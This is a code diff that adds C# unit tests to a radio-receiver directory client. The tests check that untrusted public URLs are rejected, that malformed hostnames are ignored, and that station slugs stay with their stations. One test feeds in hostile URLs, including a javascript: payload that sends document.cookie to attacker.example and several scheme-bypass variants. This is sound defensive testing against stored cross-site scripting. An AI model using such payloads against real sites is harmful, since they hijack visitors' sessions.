@@ -242,6 +242,123 @@ public class UberSdrDirectoryTests
     }
 
     [Fact]
+    public async Task A_Public_Url_That_Is_Not_A_Link_Is_Never_Carried()
+    {
+        // Stored cross-site scripting, with a third party holding the pen. Escaping the four HTML
+        // characters does not touch a scheme, and none of these carries one of them; a
+        // javascript: URL in an href runs in the visitor's session on this site's origin. The
+        // directory is somebody else's server and anybody who can get an entry into it could
+        // otherwise run code on every visitor to this monitor.
+        foreach (string hostile in (string[])
+                 [
+                     "javascript:fetch('https://attacker.example/'+document.cookie)",
+                     "JaVaScRiPt:alert(1)",
+                     "data:text/html,<script>alert(1)</script>",
+                     "vbscript:msgbox(1)",
+                     "//attacker.example/",
+                     "/relative/path",
+                     "not a url at all",
+                     "",
+                 ])
+        {
+            var h = new Harness();
+
+            await h.RefreshAsync(Edited(Dalgety, i => i["public_url"] = hostile));
+
+            DirectoryReceiver receiver = h.Directory.Snapshot.Receivers
+                .Should().ContainSingle(r => r.Host == Dalgety).Subject;
+            receiver.SafeUrl.Should().BeNull("\"{0}\" is not a link this site may hand out", hostile);
+
+            // And what the pages are actually given falls back to the receiver's own endpoint,
+            // which is built from a host and a port and can only ever be http or https. A row
+            // with no link at all would be a worse answer than a correct one.
+            receiver.PublicUrl.Should().Be("https://m9psy-1.instance.ubersdr.org/");
+            receiver.PublicUrl.Should().StartWith("https://");
+        }
+    }
+
+    [Fact]
+    public async Task A_Real_Public_Url_Is_Kept_As_It_Was_Given()
+    {
+        var h = new Harness();
+
+        await h.RefreshAsync(Capture());
+
+        h.Directory.Snapshot.Receivers.Should().OnlyContain(
+            r => r.PublicUrl.StartsWith("http://") || r.PublicUrl.StartsWith("https://"));
+        h.Directory.Snapshot.Receivers.Single(r => r.Host == Dalgety).SafeUrl
+            .Should().Be("https://m9psy-1.instance.ubersdr.org/",
+                "a link the directory gave and that checks out is the one to use");
+    }
+
+    [Fact]
+    public async Task A_Host_That_Is_Not_A_Hostname_Is_Ignored_And_Said_Once()
+    {
+        // Not a filter about the receiver but about the string: a host with a space in it cannot
+        // be made into an endpoint, and the failure would otherwise surface much later and far
+        // less obviously - a pre-flight throwing UriFormatException from inside a station a
+        // visitor is waiting on.
+        var h = new Harness();
+
+        await h.RefreshAsync(Edited(Dalgety, i => i["host"] = "m9psy 1.instance.ubersdr.org"));
+
+        h.Directory.Snapshot.Receivers.Should().NotContain(r => r.Host.Contains(' '));
+        h.Errors.Should().ContainSingle().Which.Should()
+            .Contain("is not a hostname").And.Contain("being ignored");
+
+        // Once per host, ever. A directory carrying one bad entry for a week is not a reason to
+        // write the same line every five minutes.
+        await h.RefreshAsync(Edited(Dalgety, i => i["host"] = "m9psy 1.instance.ubersdr.org"));
+        h.Errors.Should().ContainSingle();
+    }
+
+    [Fact]
+    public async Task An_Instance_That_Lists_No_Iq_Modes_Is_Not_Offered()
+    {
+        // Silence is not consent: the filter is "public_iq_modes contains the mode we use", and
+        // an absent or empty list satisfies that in no reading. Listing one anyway would put a
+        // receiver on the picker that everybody picking it would find unreachable.
+        foreach (Action<JsonObject> without in (Action<JsonObject>[])
+                 [i => i.Remove("public_iq_modes"), i => i["public_iq_modes"] = new JsonArray()])
+        {
+            var h = new Harness();
+
+            await h.RefreshAsync(Edited(Dalgety, without));
+
+            h.Directory.Snapshot.Receivers.Should().NotContain(r => r.Host == Dalgety);
+            h.Directory.Snapshot.Receivers.Should().Contain(r => r.Host == Reading);
+        }
+    }
+
+    [Fact]
+    public async Task A_Slug_Stays_With_Its_Station_After_Its_Receiver_Leaves_The_Directory()
+    {
+        // The station is still built, still registered on the router, and still reachable by
+        // anybody who bookmarked it. Handing its slug to a receiver that has just appeared would
+        // serve one operator's receiver under another operator's name.
+        var h = new Harness();
+        await h.RefreshAsync(Capture());
+        h.Directory.Bind("m9psy-1", Dalgety);
+
+        // Dalgety is gone from the directory entirely, and a newcomer wants what was its slug.
+        const string Newcomer = "m9psy-1.tunnel.ubersdr.org";
+        await h.RefreshAsync(Without(Dalgety, then: doc =>
+        {
+            JsonObject other = doc["instances"]!.AsArray().Select(i => i!.AsObject())
+                .Single(i => (string?)i["host"] == "m9psy.tunnel.ubersdr.org");
+            other["host"] = Newcomer;
+        }));
+
+        IReadOnlyList<DirectoryReceiver> after = h.Directory.Snapshot.Receivers;
+        after.Should().NotContain(r => r.Host == Dalgety, "the directory has stopped listing it");
+        after.Single(r => r.Host == Newcomer).Slug.Should().Be(
+            "m9psy-1-tunnel-ubersdr-org",
+            "/r/m9psy-1/ still answers for a station this process is still running");
+        after.Should().NotContain(r => r.Slug == "m9psy-1");
+        h.Lines.Should().Contain(l => l.Contains("still") && l.Contains("m9psy-1"));
+    }
+
+    [Fact]
     public async Task A_Directory_Outage_Keeps_The_Last_Good_List_And_Says_So()
     {
         var h = new Harness();
@@ -317,6 +434,23 @@ public class UberSdrDirectoryTests
             .Select(i => i!.AsObject())
             .Single(i => (string?)i["host"] == host);
         edit(instance);
+        return document.ToJsonString();
+    }
+
+    /// <summary>The capture with one instance removed, and anything else the test wants done.</summary>
+    private static string Without(string host, Action<JsonNode>? then = null)
+    {
+        JsonNode document = JsonNode.Parse(Capture())!;
+        JsonArray instances = document["instances"]!.AsArray();
+        for (int i = instances.Count - 1; i >= 0; i--)
+        {
+            if ((string?)instances[i]!["host"] == host)
+            {
+                instances.RemoveAt(i);
+            }
+        }
+
+        then?.Invoke(document);
         return document.ToJsonString();
     }
 
